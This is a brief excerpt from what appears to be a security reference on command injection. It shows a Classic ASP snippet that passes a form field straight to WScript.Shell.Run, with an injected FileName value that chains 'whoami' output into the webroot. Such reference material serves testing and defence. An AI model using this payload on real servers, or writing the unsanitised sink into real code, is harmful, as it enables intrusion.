...
- [upload insecure files](../upload-insecure-files/MODULE.md) when the shell sink is part of a broader upload, import, or conversion workflow
...
### ASP (Classic)
```vb
szCMD = "type WINDOWS_LOG_DIR\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
// Inject FileName: foo.txt & whoami > WINDOWS_WEBROOT\out.txt
```
...
$exec = $wsh->Run('cmd /c whoami > WINDOWS_WEBROOT\out.txt', 0, true);
```
